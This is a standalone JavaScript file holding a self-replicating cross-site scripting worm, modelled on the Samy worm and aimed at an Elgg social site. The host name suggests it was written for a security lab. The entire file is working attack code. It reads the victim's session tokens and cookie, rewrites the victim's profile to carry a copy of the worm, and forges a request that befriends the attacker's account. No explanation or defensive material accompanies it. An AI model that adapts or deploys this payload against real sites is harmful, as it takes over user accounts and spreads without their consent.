
<script id="worm" type="text/javascript">
window.onload = function(){
var headerTag="<script id=\"worm\" type=\"text/javascript\">";
var jscodeTag=document.getElementById("worm").innerHTML;
var footerTag="</"+"script/>";

var wormcode= encodeURIComponent(headerTag+jscodeTag+footerTag);
var desc="&description=SAMY+is+MY+HERO"+ wormcode;
desc+="&accesslevel%5Bdescription%5D=2";
var name="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

// the url of the target to post the payload to
var sendurl="http://www.xsslabelgg.com/action/profile/edit"

var samyGuid="47";
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
content=ts+token+desc+name+guid;
Ajax.send(content);


//Construct the HTTP request to add Samy as a friend.
var friendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + token + ts;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",friendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
}
}
</script>


